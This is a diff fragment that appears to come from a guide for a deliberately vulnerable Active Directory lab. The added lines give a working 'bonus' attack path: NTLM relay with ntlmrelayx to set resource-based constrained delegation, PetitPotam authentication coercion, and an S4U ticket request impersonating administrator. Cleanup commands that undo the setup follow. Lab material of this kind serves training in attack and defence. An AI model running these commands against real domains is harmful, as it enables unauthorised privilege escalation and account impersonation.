+Enter-PSSession -ComputerName ws02.akatsuki.local
+```
+
+### RBCD via NTLM Relay (Bonus Attack Path)
+
+If you can coerce authentication but don't have write access yet:
+
+```bash
+# Step 1: Start ntlmrelayx with RBCD escalation
+# This will relay captured auth to LDAP and set RBCD automatically
+ntlmrelayx.py -t ldaps://10.10.12.10 --delegate-access --escalate-user 'YOURPC$'
+
+# Step 2: Coerce a machine to authenticate to you
+python3 PetitPotam.py YOUR_IP 10.10.12.11
+
+# Step 3: ntlmrelayx will relay and configure RBCD
+# Output: Delegating access for YOURPC$ on WS01$
+
+# Step 4: Continue with S4U attack as above
+getST.py -spn cifs/ws01.akatsuki.local -impersonate administrator \
+  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
+```
 
 ### Cleanup: Remove Vulnerability
 
 ```powershell
+# Remove RBCD configuration from WS02
+Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount $null
+
+# Verify removal
+Get-ADComputer WS02 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# Remove the fake machine account
+Remove-ADComputer YOURPC -Confirm:$false
+
 # Remove orochimaru's write access
 $ws02 = Get-ADComputer WS02
 $acl = Get-Acl "AD:\$($ws02.DistinguishedName)"
